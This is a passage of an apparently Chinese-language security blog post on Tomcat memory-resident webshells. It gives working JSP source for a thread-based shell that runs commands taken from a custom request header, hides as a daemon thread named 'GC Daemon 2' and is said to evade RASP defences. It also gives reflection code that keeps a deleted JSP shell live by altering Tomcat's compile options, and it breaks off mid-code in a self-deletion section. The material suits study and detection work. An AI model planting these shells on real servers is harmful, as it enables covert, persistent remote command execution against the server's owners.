class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> HashSet&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">    java.util.<span class="type">Timer</span> <span class="variable">executeSchedule</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Timer();</span><br><span class="line">    executeSchedule.schedule(<span class="keyword">new</span> <span class="title class_">java</span>.util.TimerTask() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            List&lt;Object&gt; list = getRequest();</span><br><span class="line">            <span class="keyword">if</span> (list.size() == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!set.contains(list.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                    set.add(list.get(<span class="number">0</span>));</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(list.get(<span class="number">1</span>).toString());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="线程型内存马"><a href="#线程型内存马" class="headerlink" title="线程型内存马"></a>线程型内存马</h3><p>根据以上的思考，可以发现，所谓的 Timer 型内存马，实际上就是想办法在服务器上启动一个永远不会被 GC 的线程，在此线程中定时或循环执行恶意代码，达到内存马的目的。</p>
<p>首先创建了一个独立于请求的线程，由这个线程里的动作用来实现恶意行为，这个线程里的行为不会自然终止，会持续运行直到 JVM 退出。</p>
<p>守护线程非常符合上述特征。新建线程的操作在攻击中有很多好处，其中之一就是可以绕过 RASP 类型的防御手段。</p>
<p>所以上面的 Timer 型内存马的关键代码可以修改为如下代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                    <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                target = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (List) getField(target, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                                target = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                threadName = (String) target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(target, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line">                                <span class="keyword">if</span> (threadName != <span class="literal">null</span> &amp;&amp; !threadName.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">note</span> <span class="operator">=</span> target.getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, <span class="type">int</span>.class).invoke(target, <span class="number">1</span>);</span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">req</span>  <span class="operator">=</span> note.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(note);</span><br><span class="line">                                    List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                                    list.add(req);</span><br><span class="line">                                    list.add(threadName);</span><br><span class="line">                                    <span class="keyword">return</span> list;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新建线程，加入到 system 线程组中</span></span><br><span class="line">    <span class="type">Thread</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(getSystemThreadGroup(), <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 死循环</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 恶意逻辑</span></span><br><span class="line">                    List&lt;Object&gt; list = getRequest();</span><br><span class="line">                    <span class="keyword">if</span> (list.size() == <span class="number">2</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!set.contains(list.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                            set.add(list.get(<span class="number">0</span>));</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                Runtime.getRuntime().exec(list.get(<span class="number">1</span>).toString());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// while true + sleep ，相当于 Timer 定时任务</span></span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 给线程起名叫 GC Daemon 2，没人会注意吧~</span></span><br><span class="line">    &#125;, <span class="string">&quot;GC Daemon 2&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设为守护线程</span></span><br><span class="line">    d.setDaemon(<span class="literal">true</span>);</span><br><span class="line">    d.start();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，我这里是创建了一个守护线程，命名为 “GC Daemon 2”，然后把它直接放在了 system 线程组中，用来隐蔽自己。线程中是跟 Timer 型内存马一样的循环执行 request 中带入的命令的逻辑。</p>
<h2 id="十二、JSP型内存马"><a href="#十二、JSP型内存马" class="headerlink" title="十二、JSP型内存马"></a>十二、JSP型内存马</h2><p><a class="link"   href="https://xz.aliyun.com/t/10372" >JSP内存马研究 - 先知社区 (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.anquanke.com/post/id/224698" >Tomcat容器攻防笔记之JSP金蝉脱壳-安全客 - 安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在上述 Timer 内存马的分析流程中，涉及到了 JSP 的处理流程。虽然现在知道 Timer 型内存马本身跟 JSP 没太大关系，但是还是发现了可以实现类似 Servlet-API 型内存马的新方式——也就是JSP型内存马。</p>
<p>jsp与之前我们讨论的 Servlet 型内存马类似，我们可以自己创建对应的类放在相应的位置。此处的重点在于如何绕过访问时的对于 JSP 状态一些判断。在Tomcat中<code>jsp</code>和<code>jspx</code>都会交给<code>JspServlet</code>处理，所以要想实现<code>JSP</code>驻留内存，首先得分析<code>JspServlet</code>的处理逻辑。</p>
<p><strong>jsp加载大致流程</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">JspServlet#service 				//主要的功能是接收请求的URL，判断是否预编译 	-&gt; </span><br><span class="line">  JspServlet#serviceJspFile		//preCompile中当请求参数以jsp_precompile开始会进行预编译,默认情况下也不会预编译。 -&gt;</span><br><span class="line">  JspServletWrapper#service		//编译class，将其注册为servlet，调用servlet.servlet</span><br><span class="line">    Options#getDevelopment		//进行编译class</span><br><span class="line">      JspCompilationContext#compile	//判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件</span><br><span class="line">    JspServletWrapper#getServlet()	//注册servlet</span><br><span class="line">    Servlet.service				//至此完成</span><br></pre></td></tr></table></figure></div>

<p><strong>说一下这个getServlet</strong></p>
<blockquote>
<p>首先判断<code>theServlet</code>是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过<code>InstanceManager.newInstance</code>创建Servlet,并将创建的Servlet保存在<code>theServlet</code>属性中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Servlet <span class="title function_">getServlet</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">// getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。</span></span><br><span class="line">        <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">//如果theServlet中有值则销毁该Servlet.</span></span><br><span class="line">                    destroy();</span><br><span class="line">                    <span class="keyword">final</span> Servlet servlet;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//创建Servlet实例</span></span><br><span class="line">                        <span class="type">InstanceManager</span> <span class="variable">instanceManager</span> <span class="operator">=</span> InstanceManagerFactory.getInstanceManager(config);</span><br><span class="line">                        servlet = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> ExceptionUtils</span><br><span class="line">                                .unwrapInvocationTargetException(e);</span><br><span class="line">                        ExceptionUtils.handleThrowable(t);</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JasperException</span>(t);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">//初始化servlet</span></span><br><span class="line">                    servlet.init(config);</span><br><span class="line">                    <span class="keyword">if</span> (theServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">                        ctxt.getRuntimeContext().incrementJspReloadCount();</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">//将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。</span></span><br><span class="line">                    theServlet = servlet;</span><br><span class="line">                    reload = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> theServlet;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>其中<code>theServlet</code>是由<code>volatile</code>修饰的，在不同的线程之间可以共享，再通过<code>synchronized (this)</code>加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要<code>this</code>是一个值，那么<code>theServlet</code>属性的值是一样的，而<code>this</code>就是当前的<code>jspServletWrapper</code>，我们访问不同的JSP也是由不同的<code>jspServletWrapper</code>处理的。</p>
</blockquote>
<p><strong>要想要完成内存驻留，我们要解决下面的问题。</strong></p>
<blockquote>
<ul>
<li>请求后不去检查JSP文件是否存在</li>
<li>theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理</li>
</ul>
</blockquote>
<p>第二个问题比较容易，<code>theServlet</code>能否获取到Servlet或者获取到哪个Servlet，是与<code>jspServletWrapper</code>是有关的，而在<code>JspServlet#serviceJspFile</code>中，如果我们已经将Servlet注册过，可以根据url从<code>JspRuntimeContext</code>中获取得到对应的<code>jspServletWrapper</code>。</p>
<p><del>感觉最近学的太多了，现在看这个东西，脑袋好像装满了，进不去啊，看的头大。。。。继续看吧</del></p>
<h3 id="请求后不去检查JSP文件是否存在"><a href="#请求后不去检查JSP文件是否存在" class="headerlink" title="请求后不去检查JSP文件是否存在"></a>请求后不去检查JSP文件是否存在</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>在参考文章中说到：</p>
<blockquote>
<p>默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由<code>JspCompilationContext#compile</code>进行编译。看下编译部分都做了什么，Tomcat默认使用<code>JDTCompiler</code>编译，首先通过<code>isOutDated</code>判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过<code>jspCompiler.compile()</code>编译。</p>
</blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    <span class="comment">// 这里检测是否进行编译</span></span><br><span class="line">                    <span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                        ctxt.compile();</span><br><span class="line">                        mustCompile = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (compileException != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Throw cached compilation exception</span></span><br><span class="line">                    <span class="keyword">throw</span> compileException;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">........................</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中涉及到的编译方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException &#123;</span><br><span class="line">      <span class="comment">//获取编译器，默认使用JDTCompiler编译</span></span><br><span class="line">        createCompiler();</span><br><span class="line">      <span class="comment">//通过isOutDated决定是否编译</span></span><br><span class="line">        <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isRemoved()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(jspUri);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//删除已经生成的java和Class文件</span></span><br><span class="line">                jspCompiler.removeGeneratedFiles();</span><br><span class="line">                jspLoader = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">//编译</span></span><br><span class="line">                jspCompiler.compile();</span><br><span class="line">                jsw.setReload(<span class="literal">true</span>);</span><br><span class="line">                jsw.setCompilationException(<span class="literal">null</span>);</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>如果我们能让 <code>options.getDevelopment()</code> 返回false就不会进入<code>complie</code>部分。</p>
<p><code>development</code>并不是一个<code>static</code>属性，所以不能直接修改，要拿到<code>options</code>的对象。<code>options</code>对象被存储在<code>JspServlet</code>中</p>
<p>而<code>MappingData</code>中保存了路由匹配的结果,<code>MappingData</code>的<code>wrapper</code>字段包含处理请求的<code>wrapper</code>，在Tomcat中，<code>Wrapper</code>代表一个Servlet，它负责管理一个 Servlet，包括的 Servlet的装载、初始化、执行以及资源回收。在<code>Wrapper</code>的<code>instance</code>属性中保存着<code>servlet</code>的实例，因此我们可以从<code>MappingData</code>中拿到<code>JspServlet</code>进而更改<code>options</code>的<code>development</code>属性值</p>
<p>所以我们可以通过反射对<code>development</code>的属性修改</p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.EmbeddedServletOptions&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从request对象中获取request属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line">    <span class="comment">//获取MappingData</span></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="comment">//获取Wrapper</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">    <span class="comment">//获取jspServlet对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line">    <span class="comment">//获取options中保存的对象 </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Option</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;options&quot;</span>);</span><br><span class="line">    Option.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">EmbeddedServletOptions</span> <span class="variable">op</span> <span class="operator">=</span> (EmbeddedServletOptions) Option.get(jspServlet);</span><br><span class="line">    <span class="comment">//设置development属性为false</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Developent</span> <span class="operator">=</span> op.getClass().getDeclaredField(<span class="string">&quot;development&quot;</span>);</span><br><span class="line">    Developent.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Developent.set(op,<span class="literal">false</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>当我们第二次请求我们的脚本</strong><code>development</code><br><strong>的属性值已经被改为false,即使我们删除对应的</strong><code>jsp\java\Class</code><strong>文件，仍然还可以还可以正常请求shell。</strong></p>
<p><strong>但是如果我们想修改一个已经加载为</strong><code>Servlet</code> <strong>的JSP文件，即使修改了也不会生效。</strong></p>
<p>因加载一次后mustCompile为false 且我们修改了Development值为false，不再进行重新编译改写了</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>在上面跟源码的时候，我们也能看见，在compile中，如果我们能让<code>isOutDated</code>返回false，也可以达到绕过的目的。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException &#123;</span><br><span class="line">        createCompiler();</span><br><span class="line">        <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">         ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>注意看下面的代码,在<code>isOutDated</code>中，当满足下面的条件则会返回false。<code>jsw</code>中保存的是<code>jspServletWarpper</code>对象，所以是不为null的，并且<code>modificationTestInterval</code>默认值是4也满足条件，所以我们现在要做的就是让<code>modificationTestInterval*1000</code>大于<code>System.currentTimeMillis()</code>,所以</p>
<p> <strong>只要将</strong><code>modificationTestInterval</code> <strong>修改为一个比较大的值也可以达到绕过的目的。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isOutDated</span><span class="params">(<span class="type">boolean</span> checkClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (jsw != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; (ctxt.getOptions().getModificationTestInterval() &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (jsw.getLastModificationTest()</span><br><span class="line">                    + (ctxt.getOptions().getModificationTestInterval() * <span class="number">1000</span>) &gt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>modificationTestInterval</code>也保存在<code>options</code>属性中，所以修改的方法和方法一类似。</p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.servlet.JspServletWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ConcurrentHashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.compiler.JspRuntimeContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line"></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">rctxt</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;rctxt&quot;</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspRuntimeContext</span> <span class="variable">jspRuntimeContext</span> <span class="operator">=</span> (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">jspsF</span> <span class="operator">=</span> jspRuntimeContext.getClass().getDeclaredField(<span class="string">&quot;jsps&quot;</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ConcurrentHashMap</span> <span class="variable">jsps</span> <span class="operator">=</span> (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">JspServletWrapper</span> <span class="variable">jsw</span> <span class="operator">=</span> (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">    jsw.setLastModificationTest(<span class="number">8223372036854775807L</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="实现自删除"><a href="#实现自删除" class="headerlink" title="实现自删除"></a>实现自删除</h3><p>上面只是分析了如何让我们的JSP在删除了<code>JSP\java\Class</code>文件后还能访问，下面我们分析如何在<code>JSP</code>中实现删除<code>JSP\java\Class</code>文件，在<code>JspCompilationContext</code>保存着 JSP 编译的上下文信息，我们可以从中拿到<code>java/class</code>的绝对路径。</p>
<p>而<code>JspCompilationContext</code>对象保存在<code>JspServletWrapper</code>中，所以要先获取<code>JspServletWrapper</code></p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从request对象中获取request属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line">    <span class="comment">//获取MappingData</span></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="comment">//获取Wrapper，这里的Wrapper是StandrardWrapper</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> 